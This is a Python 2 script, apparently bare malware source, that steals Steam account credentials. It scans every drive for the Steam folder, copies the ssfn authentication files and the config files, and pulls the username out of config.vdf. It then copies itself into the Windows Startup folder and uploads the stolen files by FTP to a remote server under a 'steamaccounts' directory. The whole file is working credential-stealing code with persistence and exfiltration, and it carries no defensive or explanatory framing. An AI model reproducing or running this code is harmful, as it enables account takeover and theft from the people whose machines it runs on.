import os
import subprocess
import shutil
import ftplib
import tempfile
import getpass

def mainfunction():
    global mainexename
    global exefilepath
    global startdirectory
    global createtempfile
    global tempdir
    global driveletter
    global steamusername

    drivelist = []
    steampath = ""
    exefilepath = __file__
    mainexename = os.path.basename(__file__)
    startdirectory = os.getcwd()
    createtempfile = tempfile.mkdtemp()
    proc = subprocess.Popen('wmic logicaldisk get name', stdout=subprocess.PIPE, shell=True)
    drives = proc.stdout.read().split()
    for letter in drives[1:]:
        drivelist.append(letter)
    for driveletter in drivelist:
        dirname = steampath.join(driveletter + '\Program Files (x86)\Steam\\')
        directoryexist = os.path.lexists(dirname)

        if directoryexist == 1:
            filelist = os.listdir(dirname)
            os.chdir(createtempfile)
            tempdir = os.getcwd()
            mainpath = os.getcwd() + '//'
            for steamfiles in filelist:
                if steamfiles.startswith('ssfn'):
                    copysteamssfn(steamfiles, dirname, mainpath)
                if steamfiles.startswith('config'):
                    copysteamconfig(steamfiles, dirname, mainpath)

            listconfigfiles = os.listdir(mainpath)
            for configfile in listconfigfiles:
                if configfile.startswith('config'):
                    config = open(mainpath + 'config.vdf', mode='r')
                    createtempfile = config.read().lower().rsplit()
                    steamusername = createtempfile[10]
                    config.close()

            addtostartup(driveletter)
        else:
            print 'No Steam directory found on drive {0}'.format(driveletter)
            addtostartup(driveletter)

def copysteamssfn(files, steampath, mainpath):
    ssfnpath = steampath + files
    shutil.copy(ssfnpath, mainpath)

def copysteamconfig(files, path, mainpath):

    configpath = path + files
    filelist = os.listdir(configpath)
    for confiles in filelist:
        condir = path + 'config\\' + confiles
        shutil.copy(condir, mainpath)

def addtostartup(letters):
    windowsuser = getpass.getuser()
    if os.path.isfile(letters + '\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\{1}'.format(windowsuser, mainexename)) == True:
        try:
            print 'exe alrdy in startup folder.'
            sendtoftp()
        except Exception, _error_:
            print _error_
    else:
        try:
            shutil.copy(exefilepath, letters + '\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(windowsuser))
            print 'placing .exe file in startup'
            sendtoftp()
        except Exception, _error_:
            print _error_

def sendtoftp():
    ftp = ftplib.FTP('???.???.??.???')
    ftp.login(user='username', passwd='password')
    ftp.cwd('/home/users/ftp/steamaccounts')
    ftpfolderlist = ftp.nlst()
    if steamusername[1:-1] in ftpfolderlist:
        print 'User Folder {0} alrdy exist.'.format(steamusername[1:-1])
        print 'will now exit!'
        SystemExit()
    else:
        ftp.mkd(dirname='%s' % steamusername[1:-1])
        ftp.cwd('/home/users/ftp/steamaccounts %s' % steamusername[1:-1])
        steamfilelist = os.listdir(tempdir)
        for files in steamfilelist:
            filepath = tempdir + '\\' + files
            openfile = open('%s' % filepath, mode='rb')
            ftp.storbinary('STOR %s' % files, openfile)
            openfile.close()

mainfunction() 
